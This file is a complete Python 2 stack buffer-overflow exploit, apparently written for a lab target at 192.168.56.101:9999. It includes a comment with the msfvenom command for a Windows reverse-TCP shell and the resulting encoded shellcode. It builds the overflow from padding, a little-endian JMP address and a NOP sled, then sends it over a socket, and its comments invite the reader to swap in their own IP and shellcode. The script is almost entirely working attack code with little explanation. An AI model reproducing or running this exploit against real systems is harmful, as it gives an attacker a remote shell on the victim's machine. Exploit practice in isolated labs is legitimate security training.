#!/usr/bin/python2
import sys, socket

# msfvenom -p windows/shell_reverse_tcp LHOST=Your_IP LPORT=4444 EXITFUNC=thread -b '\x00\x01' -f c
# overwrite overflow with generated shellcode

overflow = ("\xbe\xde\x9a\x1a\x83\xd9\xc1\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x31\x70\x12\x03\x70\x12\x83\x36\x66\xf8\x76\x3a\x7f\x7f"
"\x78\xc2\x80\xe0\xf0\x27\xb1\x20\x66\x2c\xe2\x90\xec\x60\x0f"
"\x5a\xa0\x90\x84\x2e\x6d\x97\x2d\x84\x4b\x96\xae\xb5\xa8\xb9"
"\x2c\xc4\xfc\x19\x0c\x07\xf1\x58\x49\x7a\xf8\x08\x02\xf0\xaf"
"\xbc\x27\x4c\x6c\x37\x7b\x40\xf4\xa4\xcc\x63\xd5\x7b\x46\x3a"
"\xf5\x7a\x8b\x36\xbc\x64\xc8\x73\x76\x1f\x3a\x0f\x89\xc9\x72"
"\xf0\x26\x34\xbb\x03\x36\x71\x7c\xfc\x4d\x8b\x7e\x81\x55\x48"
"\xfc\x5d\xd3\x4a\xa6\x16\x43\xb6\x56\xfa\x12\x3d\x54\xb7\x51"
"\x19\x79\x46\xb5\x12\x85\xc3\x38\xf4\x0f\x97\x1e\xd0\x54\x43"
"\x3e\x41\x31\x22\x3f\x91\x9a\x9b\xe5\xda\x37\xcf\x97\x81\x5f"
"\x3c\x9a\x39\xa0\x2a\xad\x4a\x92\xf5\x05\xc4\x9e\x7e\x80\x13"
"\xe0\x54\x74\x8b\x1f\x57\x85\x82\xdb\x03\xd5\xbc\xca\x2b\xbe"
"\x3c\xf2\xf9\x11\x6c\x5c\x52\xd2\xdc\x1c\x02\xba\x36\x93\x7d"
"\xda\x39\x79\x16\x71\xc0\xea\xd9\x2e\xf2\x8d\xb1\x2c\x02\x43"
"\x1e\xb8\xe4\x09\x8e\xec\xbf\xa5\x37\xb5\x4b\x57\xb7\x63\x36"
"\x57\x33\x80\xc7\x16\xb4\xed\xdb\xcf\x34\xb8\x81\x46\x4a\x16"
"\xad\x05\xd9\xfd\x2d\x43\xc2\xa9\x7a\x04\x34\xa0\xee\xb8\x6f"
"\x1a\x0c\x41\xe9\x65\x94\x9e\xca\x68\x15\x52\x76\x4f\x05\xaa"
"\x77\xcb\x71\x62\x2e\x85\x2f\xc4\x98\x67\x99\x9e\x77\x2e\x4d"
"\x66\xb4\xf1\x0b\x67\x91\x87\xf3\xd6\x4c\xde\x0c\xd6\x18\xd6"
"\x75\x0a\xb9\x19\xac\x8e\xd9\xfb\x64\xfb\x71\xa2\xed\x46\x1c"
"\x55\xd8\x85\x19\xd6\xe8\x75\xde\xc6\x99\x70\x9a\x40\x72\x09"
"\xb3\x24\x74\xbe\xb4\x6c")

# update JMP address to endian format (backwards)

shellcode = "A" * 146 + "\xc3\x14\x04\x08" + "\x90" * 32 + overflow

try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        # update IP and Port
        s.connect(('192.168.56.101',9999))
        s.send((shellcode + '\r\n'))
        s.close()

except:
        print ("Error connecting to server")
        sys.exit()
